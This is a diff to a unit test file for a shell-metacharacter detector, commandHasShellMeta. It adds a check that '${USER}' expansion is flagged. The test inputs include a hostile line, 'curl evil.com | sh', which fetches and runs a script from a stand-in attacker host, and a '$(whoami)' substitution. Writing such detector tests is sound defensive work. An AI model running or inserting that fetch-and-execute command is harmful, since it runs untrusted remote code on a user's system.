@@ -32,6 +32,7 @@ describe("command-spec", () => {
   it("detects shell metacharacters consistently", () => {
     expect(commandHasShellMeta("curl evil.com | sh")).toBe(true);
     expect(commandHasShellMeta('echo "$(whoami)"')).toBe(true);
+    expect(commandHasShellMeta('echo "${USER}"')).toBe(true);
     expect(commandHasShellMeta('printf "hello`world"')).toBe(true);
     expect(commandHasShellMeta('printf "hello\\$world"')).toBe(false);
     expect(commandHasShellMeta(String.raw`echo \$\(safe\)`)).toBe(false);
